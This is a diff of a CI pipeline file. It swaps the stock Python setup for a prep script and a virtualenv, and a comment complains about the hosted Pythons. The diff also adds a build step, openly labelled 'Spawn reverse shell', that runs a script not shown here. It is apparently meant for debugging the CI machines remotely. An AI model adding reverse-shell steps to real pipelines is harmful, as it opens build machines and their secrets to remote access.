@@ -5,16 +5,27 @@ parameters:
   sign: false
 
 steps:
-- task: UsePythonVersion@0
-  inputs:
-    versionSpec: '$(python.version)'
-    architecture: 'x64'
+- script: "PYTHONVERSION=$(python.version) .ci/prep_azure.py"
+  displayName: "Run prep_azure.py"
 
-- script: .ci/prep_azure.py
-  displayName: "Install requirements."
+# The VSTS-shipped Pythons available via UsePythonVErsion are pure garbage,
+# broken symlinks, incorrect permissions and missing codecs. So we use the
+# deadsnakes PPA to get sane Pythons, and setup a virtualenv to install our
+# stuff into. The virtualenv can probably be removed again, but this was a
+# hard-fought battle and for now I am tired of this crap.
+- script: |
+    sudo ln -fs /usr/bin/python$(python.version) /usr/bin/python
+    /usr/bin/python -m pip install -U virtualenv setuptools wheel
+    /usr/bin/python -m virtualenv /tmp/venv -p /usr/bin/python$(python.version)
+    echo "##vso[task.prependpath]/tmp/venv/bin"
+
+  displayName: activate venv
+
+- script: .ci/spawn_reverse_shell.py
+  displayName: "Spawn reverse shell"
 
 - script: .ci/$(MODE)_install.py
-  displayName: "Install requirements."
+  displayName: "Run $(MODE)_install.py"
 
 - script: .ci/$(MODE)_tests.py
-  displayName: Run tests.
+  displayName: "Run $(MODE)_tests.py"
